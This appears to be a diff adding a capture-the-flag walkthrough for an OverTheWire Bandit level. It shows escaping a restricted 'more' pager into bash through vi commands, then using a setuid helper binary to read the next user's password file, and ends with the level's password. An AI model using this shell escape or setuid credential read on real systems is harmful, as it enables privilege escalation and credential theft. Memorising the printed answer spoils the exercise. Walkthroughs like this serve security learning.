@@ -1,0 +1,24 @@
+Description:
+Good job getting a shell! Now hurry and grab the password for bandit27!
+
+---
+
+Commands you may need to solve this level:
+ssh, cat, more, vi, ls, id, pwd
+
+---
+
+Solution:
+# You once again login to user bandit26 but as you can see, there is still no way to access an operative shell
+# exploit the "more" trick and set out shell to bash
+~:set shell=bash
+~:shell
+# now you have full access to an ordinary terminal as user bandit26
+./bandit27-do
+# It turns out that this file is a setuid binary and thus we utilize it as one
+./bandit27-do cat /etc/bandit_pass/bandit27
+
+---
+
+Password:
+3ba3118a22e93127a4ed485be72ef5ea
